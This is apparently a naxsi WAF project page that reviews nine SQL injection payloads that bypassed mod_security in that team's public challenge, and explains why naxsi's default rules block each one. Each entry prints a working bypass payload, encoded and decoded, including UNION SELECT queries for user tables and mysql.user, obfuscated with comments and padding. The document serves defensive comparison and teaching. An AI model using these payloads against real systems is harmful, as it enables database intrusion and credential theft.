### Introduction/Disclaimer

First of all, and to prevent any trolls : We're **not** saying that naxsi is better than [mod_security]( https://modsecurity.org/ ). We think that mod_security is a great project and we have a huge respect for its team.

That being said, we will present you the results of the mod_security SQLi challenge. This challenge was organized by the mod_security people, and participants had to bypass mod_security to perform SQLi on various vulnerable web sites.

As you will see, none of the attack patterns used will bypass naxsi, because naxsi isn't clever and doesn't try to interpret stuff in requests, avoiding the risk of getting bypassed by obfuscated syntax.

Last but not least, the more uncommon a request is, the more chance they have to be blocked by naxsi.

Detailed information about the mod_security challenge can be found [here]( http://blog.spiderlabs.com/2011/07/modsecurity-sql-injection-challenge-lessons-learned.html )

#### Bypass #1 : Johannes Dahse

##### Payload
```
http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=0+div+1+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user
```

##### Decoded

```
http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=0+div+1+union#foo*/*bar
select#foo
1,2,current_user
```

##### Explanation

* Multiple SQL keywords
* SQL comments
* Uncommon characters : `, #*`

#### Bypass #2 : Vladimir Vorontsov

##### Payload

```
FromDate=a1%27+or&ToDate=%3C%3Eamount+and%27
```

##### Decoded

```
FromDate=a1'+or&ToDate=<>amount+and'
```

##### Explanation
* Multiple quotes
* `<>` Signs

#### Bypass #3 : PT Research

##### Payload

```
after=1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')&before=d
```

##### Explanation
* Multiple SQL keywords
* Multiple parenthesis
* Multiple quotes
* Naxsi is immune to splitting attacks

#### Bypass #4 : Ahmad Maulana

##### Payload

```
ToDate=1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
```

##### Explanation
* Multiple SQL keywords
* SQL comments
* Multiple quotes
* Uncommon characters : `, !`

#### Bypass #5 : Travis Lee

##### Payload

```
Cookie: ASP.NET_SessionId=c0tx0o455d0b10ylsdr03m55; amSessionId=14408158863; amUserInfo=UserName=YWRtaW4=&
Password=JyBvciAnMSc9JzEnLS0=; amUserId=1 union select username,password,3,4 from users
```

##### Explanation
* Multiple SQL keywords
* Multiple commas
* This one is really interesting, as mod_security was bypassed, not because of the pattern, but because of its location (Cookie Headers)

#### Bypass #6 : Roberto Salgado

##### Payload

```
http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=-
2%20div%201%20union%20all%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A
%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23f
afsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0
A%23fdsafdsafa%23fafsfaf%23%23yea...
truncated
...3fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%
0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%
20limit%201
```

##### Decoded

```
2 div 1 union all#yeaah
#yeah babc
#fdsafdsafa#fafsfaf##yea
#yeah babc
#fdsafdsafa#fafsfaf##yeaah...
truncated
...
like/*!31337table_name*/,3 from information_schema.tables...
```

##### Explanation
* Multiple SQL keywords
* SQL comments
* uncommon characters : `# , !`

#### Bypass #7 : Sqlmap Developers
 
##### Payload

```
http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29 
```

##### Decoded

``` 
http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=@@new union#sqlmapsqlmap...
select 1,2,database#sqlmap
() 
```

###### Explanation
* Multiple SQL keywords
* Uncommon characters : `.. # , ()`

#### Bypass #8 : HackPlayers

###### Payload

```
http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=-
2%20div%201%20union%20all%23hack%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20pl
ayer%0A%23fabuloso%23modsec%0A%23hpys%20player%0A%23fabuloso%23great%0A%23hpys%20player%
0A%23fabuloso%23modsec%0A%23h...
truncated
...23hpys%20player%0A%23fabuloso%23great%23%0A%23fabuloso%23great%23%0Aselect%200x00%2C%200
x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limi
t%201
```

##### Decoded

```
-2 div 1 union all#hack
#hpys player
#fabuloso#great...
truncated
...
select 0x00, 0x41 not like/*!00000table_name*/,3 from information_schema.tables limit 1
```

##### Explanation

* Multiple SQL keywords
* SQL comments
* Uncommon characters : `# , ! `

#### Bypass #9 : Georgi Geshev
 
##### Payload

```
http://www.modsecurity.org/testphp.vulnweb.com/listproducts.php?artist=1%0bAND(SELECT%0b1%20FROM%20mysql.x)
```

##### Explanation
* Multiple SQL keywords


### Final WORD
All those tests where realized on a 'out of the box' naxsi, we I did no customization nor any modifications whatsoever.
